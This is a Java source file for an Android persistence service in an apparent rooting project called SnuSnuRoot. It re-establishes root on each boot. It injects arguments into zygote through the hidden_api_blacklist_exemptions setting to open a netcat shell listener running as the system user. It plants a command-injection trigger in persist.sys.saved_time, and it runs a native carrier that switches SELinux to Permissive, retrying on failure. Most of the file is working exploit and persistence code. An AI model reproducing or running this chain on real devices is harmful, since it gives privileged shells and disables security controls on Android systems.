package io.github.voidnullvalue.snusnuroot.persistence;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.IBinder;
import android.provider.Settings;
import android.util.Log;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.Socket;

public final class PersistenceService extends Service {
    private static final String TAG = "SnuSnuPersist";
    private static final String ENABLED_KEY = "snusnu_persist_enabled";
    private static final String STATUS_KEY = "snusnu_persist_status";
    private static final String REARM_STATUS_KEY = "snusnu_rearm_status";
    private static final String RETRY_COUNT_KEY = "snusnu_retry_count";
    private static final String NATIVE_RESULT_KEY = "snusnu_native_result";
    private static final String BOOT_ID_KEY = "snusnu_persist_boot_id";
    private static final String EXEMPTIONS = "hidden_api_blacklist_exemptions";
    /* PS7319 boot fix. Upstream keeps the carrier's scratch output in
     * /data/securedStorageLocation/snusnu/state. That tree is
     * assetstorage_data_file, and this firmware's policy grants system_app -- the
     * UID-1000 domain this service's injected channel runs in -- no search on it,
     * so the channel's rm/create/read all return EACCES and every boot ends in
     * system_native_failed:
     *   avc: denied { search } for name="securedStorageLocation"
     *     scontext=u:r:system_app:s0 tcontext=u:object_r:assetstorage_data_file:s0
     * Measured, not inferred. /data/cache is cache_file, which system_app may
     * search and create/unlink in, so the state lives there instead. It is also
     * created on demand below, because /data/cache is scratch space and is not
     * guaranteed to survive an OTA. */
    private static final String STATE_DIR = "/data/cache/snusnu/state";
    private static final String TRIGGER =
            "x[$(sleep 30;/system/bin/sh /data/securedStorageLocation/w/b)]000";
    /* The re-arm watchdog is installed by root at WATCHDOG_PATH, not generated
     * here. It used to be written into the actor's own 0777 scratch directory and
     * executed from there, which let any local app replace it and run code as
     * uid 1000 -- a direct path back to re-arming root. The script is now
     * root-owned 0755 in a root-owned 0755 directory: the actor can run it but
     * not modify it. Source of truth: stage4-persistent/watchdog.sh.
     *
     * Why a watchdog is needed at all: persist.sys.saved_time is not durable on
     * this firmware. Amazon's TimeService NTP-syncs over it ~20 s and ~130 s into
     * boot, overwriting the armed trigger, so the NEXT boot would have nothing to
     * fire while this actor still reported success. See watchdog.sh. */
    private static final String WATCHDOG_PATH = "/data/snusnu_root/bin/watchdog.sh";
    private static final int SYSTEM_CHANNEL_PORT = 4321;
    private static final int NOTIFICATION_ID = 31317;
    private static final String NOTIFICATION_CHANNEL = "snusnu_persistence";
    private static volatile boolean running;
    private static volatile boolean rerunRequested;
    private String currentBootId;

    @Override
    public void onCreate() {
        super.onCreate();
        NotificationManager manager = getSystemService(NotificationManager.class);
        NotificationChannel channel = new NotificationChannel(NOTIFICATION_CHANNEL,
                "SnuSnuRoot startup", NotificationManager.IMPORTANCE_LOW);
        channel.setDescription("Restores SnuSnuRoot after device startup");
        manager.createNotificationChannel(channel);
        Notification notification = new Notification.Builder(this, NOTIFICATION_CHANNEL)
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setContentTitle("SnuSnuRoot")
                .setContentText("Restoring privileged state")
                .setOngoing(true)
                .build();
        startForeground(NOTIFICATION_ID, notification);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        synchronized (PersistenceService.class) {
            if (running) {
                rerunRequested = true;
                return START_NOT_STICKY;
            }
            running = true;
        }
        new Thread(() -> {
            try {
                do {
                    rerunRequested = false;
                    runPersistence();
                    if (rerunRequested) {
                        try {
                            Thread.sleep(2000L);
                        } catch (InterruptedException interrupted) {
                            Thread.currentThread().interrupt();
                            break;
                        }
                    }
                } while (rerunRequested);
            } finally {
                running = false;
                stopSelf();
            }
        }, "snusnu-persist").start();
        return START_NOT_STICKY;
    }

    private void runPersistence() {
        ContentResolver resolver = getContentResolver();
        if (!"1".equals(Settings.Global.getString(resolver, ENABLED_KEY))) {
            Log.i(TAG, "disabled by global setting");
            return;
        }
        if (checkSelfPermission(Manifest.permission.WRITE_SECURE_SETTINGS)
                != PackageManager.PERMISSION_GRANTED) {
            report("missing_write_secure_settings");
            return;
        }
        String bootId = firstLine("/proc/sys/kernel/random/boot_id");
        Context deviceContext = createDeviceProtectedStorageContext();
        String previousBoot = deviceContext.getSharedPreferences("state", MODE_PRIVATE)
                .getString("last_boot_id", "");
        if (bootId != null && bootId.equals(previousBoot)) {
            Log.i(TAG, "already attempted this boot");
            return;
        }
        if (bootId != null) {
            currentBootId = bootId;
        }
        resolver.delete(Settings.Global.getUriFor(NATIVE_RESULT_KEY), null, null);
        Settings.Global.putString(resolver, REARM_STATUS_KEY, "pending");
        report("starting");

        /* Schedule the guard first, independently of exploit success. 4460N
         * normally leaves saved_time armed after time_update exits, but the
         * UID-1000 worker restores it if that vendor behavior ever changes. */
        if (!spawnSystemChannel()) {
            report("rearm_spawn_failed");
            return;
        }
        String worker = "(mkdir -p " + STATE_DIR + " 2>/dev/null; "
                /* Start the re-arm watchdog first, so the trigger is held armed
                 * while the slower exploit path below runs. It is read from a
                 * root-owned path and never written here. */
                + "if [ ! -x " + WATCHDOG_PATH + " ]; then "
                + "settings put global " + REARM_STATUS_KEY + " watchdog_missing; "
                + "echo __SNU_WATCHDOG_MISSING__; exit; fi; "
                + "setsid /system/bin/sh " + WATCHDOG_PATH + " "
                + "</dev/null >/dev/null 2>&1 & "
                + "for i in $(seq 1 180); do "
                + "status=$(settings get global " + STATUS_KEY + "); "
                + "case \"$status\" in kernel_write_ok|*failed*) break ;; esac; sleep 1; done; "
                /* The watchdog owns re-arming, so this only confirms it took effect.
                 * Verification, not a second arm: two independent writers of the same
                 * property would race each other for no benefit. */
                + "armed=no; "
                + "for i in $(seq 1 20); do "
                + "if [ \"$(getprop persist.sys.saved_time)\" = '" + TRIGGER + "' ]; then "
                + "armed=yes; break; fi; sleep 1; done; "
                + "if [ \"$armed\" = yes ]; then "
                + "if [ \"$status\" = kernel_write_ok ]; then "
                + "printf '0\\n' > " + STATE_DIR + "/retry_count; sync; "
                + "settings put global " + RETRY_COUNT_KEY + " 0; "
                + "settings put global " + REARM_STATUS_KEY + " ok; "
                + "else tries=$(cat " + STATE_DIR + "/retry_count 2>/dev/null); "
                + "case \"$tries\" in ''|null|*[!0-9]*) tries=0 ;; esac; "
                + "tries=$((tries + 1)); "
                + "printf '%s\\n' \"$tries\" > " + STATE_DIR + "/retry_count; "
                + "settings put global " + RETRY_COUNT_KEY + " \"$tries\"; sync; "
                + "settings put global " + REARM_STATUS_KEY + " \"failed_no_reboot_$tries\"; "
                + "log -t SnuSnuPersist \"native failure $status; left booted for manual recovery\"; fi; "
                + "log -t SnuSnuPersist 'trigger re-armed'; else "
                + "settings put global " + REARM_STATUS_KEY + " failed; "
                + "log -t SnuSnuPersist \"re-arm failed: $(getprop persist.sys.saved_time)\"; fi) >/dev/null 2>&1 & "
                + "printf '__SNU_REARM_SCHEDULED__\\n'; exit";
        String rearm = sendSystemCommand(worker);
        if (rearm == null || !rearm.contains("__SNU_REARM_SCHEDULED__")) {
            report("rearm_command_failed");
            return;
        }
        if (bootId != null) {
            deviceContext.getSharedPreferences("state", MODE_PRIVATE).edit()
                    .putString("last_boot_id", bootId).commit();
        }
        Log.i(TAG, "UID-1000 trigger guard scheduled");
        report("rearm_scheduled");

        String nativeResult = sendSystemCommand(
                "for i in $(seq 1 120); do "
                + "[ \"$(getprop sys.boot_completed)\" = 1 ] && break; sleep 1; done; "
                + "sleep 5; mkdir -p " + STATE_DIR + " 2>/dev/null; "
                + "out=" + STATE_DIR + "/native_result; "
                + "pidfile=" + STATE_DIR + "/carrier_pid; "
                /* Build and digest gate, before anything touches the kernel.
                 *
                 * The carrier is an OTA-updatable system: an update can change
                 * the kernel while /data keeps the old carrier, and the actor
                 * would launch it on the next boot against a kernel whose
                 * selinux_enforcing address it no longer matches. Nothing about
                 * the install-time permission/label checks would catch that.
                 *
                 * The guard file is written by the installer and records what
                 * was actually verified on this device. Missing guard file =
                 * refuse, because "the check could not run" must not be treated
                 * as "the check passed". */
                + "guard=/data/cache/snusnu/expected-build; "
                + "if [ ! -f \"$guard\" ]; then echo __SNU_GUARD_MISSING__; exit; fi; "
                + "want_inc=$(sed -n 's/^incremental=//p' \"$guard\" | head -1); "
                + "got_inc=$(getprop ro.build.version.incremental); "
                + "if [ -n \"$want_inc\" ] && [ \"$got_inc\" != \"$want_inc\" ]; then "
                + "echo \"__SNU_BUILD_MISMATCH__ wanted=$want_inc got=$got_inc\"; exit; fi; "
                + "want_sha=$(sed -n 's/^carrier_sha=//p' \"$guard\" | head -1); "
                + "if [ -n \"$want_sha\" ]; then "
                + "got_sha=$(toybox sha256sum /data/snusnu_hwbinder_root 2>/dev/null | cut -d' ' -f1); "
                + "if [ \"$got_sha\" != \"$want_sha\" ]; then "
                + "echo \"__SNU_CARRIER_MISMATCH__ wanted=$want_sha got=$got_sha\"; exit; fi; fi; "
                /* Retry in-boot. Measured on this device: a boot whose first
                 * carrier attempt returned ENODATA
                 * (HWBINDER_STATEFUL result=0x5000003d00000000) succeeded on the
                 * very next attempt, leaving SELinux Permissive. Stage 1 asserted
                 * the opposite -- "in-boot carrier respawn cannot clear
                 * ENODATA/EALREADY" -- which is why the actor fires once and a miss
                 * cost a whole reboot. That assertion does not hold here, so the
                 * miss is recoverable and retrying is the fix for the ~1-in-3
                 * boot failure rate that single-shot produced.
                 *
                 * Progress is echoed per attempt on purpose: this command runs over
                 * a socket whose read timeout is 120 s, and a silent stretch longer
                 * than that would be read as a failure even when the carrier later
                 * succeeds. The lease is 30 s per attempt; the carrier answers in
                 * ~4-11 s once the 10 ms rescale is applied. */
                + "for attempt in 1 2 3 4 5; do "
                + "echo \"__SNU_CARRIER_ATTEMPT_${attempt}__\"; "
                + "rm -f \"$out\"; /data/snusnu_hwbinder_root stateful-root-hold "
                + "</dev/null >\"$out\" 2>&1 & keeper=$!; "
                + "printf '%s\\n' \"$keeper\" >\"$pidfile\"; "
                + "n=0; "
                + "while [ $n -lt 30 ]; do "
                + "if grep -q __SNU_NATIVE_0__ \"$out\" 2>/dev/null; then break; fi; "
                + "if ! kill -0 \"$keeper\" 2>/dev/null; then break; fi; "
                + "sleep 1; n=$((n + 1)); done; "
                + "if grep -q __SNU_NATIVE_0__ \"$out\" 2>/dev/null; then "
                + "cat \"$out\"; exit; fi; "
                + "echo \"__SNU_CARRIER_MISS_${attempt}__\"; "
                + "sleep 12; done; "
                + "cat \"$out\"; exit");
        Log.i(TAG, "system native result=" + nativeResult);
        Settings.Global.putString(getContentResolver(), NATIVE_RESULT_KEY,
                nativeResult == null ? "null" : nativeResult.trim().replace('\n', ';'));
        /* The gate markers mean the carrier was deliberately NOT run, which is a
         * different condition from a carrier that ran and lost its race. Report
         * them distinctly so an OTA that invalidates the install is obvious
         * rather than looking like a flaky race. */
        if (nativeResult != null) {
            if (nativeResult.contains("__SNU_BUILD_MISMATCH__")) {
                report("build_mismatch");
                return;
            }
            if (nativeResult.contains("__SNU_CARRIER_MISMATCH__")) {
                report("carrier_mismatch");
                return;
            }
            if (nativeResult.contains("__SNU_GUARD_MISSING__")) {
                report("guard_missing");
                return;
            }
        }
        if (nativeResult == null || !nativeResult.contains("__SNU_NATIVE_0__")) {
            report("system_native_failed");
            return;
        }
        report("kernel_write_ok");
    }

    private boolean spawnSystemChannel() {
        String payload = "LClass1;->method1(\n"
                + "10\n"
                + "--runtime-args\n"
                + "--setuid=1000\n"
                + "--setgid=1000\n"
                + "--runtime-flags=2049\n"
                + "--mount-external-full\n"
                + "--setgroups=3003\n"
                + "--nice-name=snusnu-persist-system\n"
                + "--seinfo=platform:targetSdkVersion=28:complete\n"
                + "--invoke-with\n"
                + "toybox nc -s 127.0.0.1 -p 4321 -L /system/bin/sh -l;\n";
        boolean wrote = false;
        try {
            wrote = Settings.Global.putString(getContentResolver(), EXEMPTIONS, payload);
            /* The proven shell path has a process boundary between put/delete.
             * Give zygote's observer the same small delivery window while the
             * foreground service remains alive, then unconditionally clean. */
            Thread.sleep(150L);
        } catch (Throwable error) {
            Log.e(TAG, "zygote injection failed", error);
        } finally {
            try {
                getContentResolver().delete(Settings.Global.getUriFor(EXEMPTIONS),
                        null, null);
            } catch (Throwable error) {
                Log.e(TAG, "CRITICAL: exemptions cleanup failed", error);
            }
        }
        String leftover = Settings.Global.getString(getContentResolver(), EXEMPTIONS);
        if (leftover != null) {
            Log.e(TAG, "CRITICAL: exemptions value remains set; aborting");
            return false;
        }
        return wrote;
    }

    private String sendSystemCommand(String command) {
        for (int attempt = 0; attempt < 20; ++attempt) {
            try (Socket socket = new Socket(InetAddress.getByName("127.0.0.1"),
                    SYSTEM_CHANNEL_PORT)) {
                socket.setSoTimeout(120000);
                PrintWriter writer = new PrintWriter(
                        new OutputStreamWriter(socket.getOutputStream()), true);
                BufferedReader reader = new BufferedReader(
                        new InputStreamReader(socket.getInputStream()));
                writer.println(command);
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append('\n');
                    if (line.contains("__SNU_REARM_SCHEDULED__")) break;
                }
                return output.toString();
            } catch (Throwable error) {
                try {
                    Thread.sleep(500L);
                } catch (InterruptedException interrupted) {
                    Thread.currentThread().interrupt();
                    return null;
                }
            }
        }
        return null;
    }

    private void report(String status) {
        Log.i(TAG, "result=" + status);
        try {
            Settings.Global.putString(getContentResolver(), STATUS_KEY, status);
            if (currentBootId != null) {
                Settings.Global.putString(getContentResolver(), BOOT_ID_KEY, currentBootId);
            }
        } catch (Throwable error) {
            Log.e(TAG, "status write failed", error);
        }
    }

    private static String firstLine(String path) {
        try (BufferedReader reader = new BufferedReader(new FileReader(path))) {
            return reader.readLine();
        } catch (Throwable error) {
            Log.e(TAG, "cannot read " + path, error);
            return null;
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
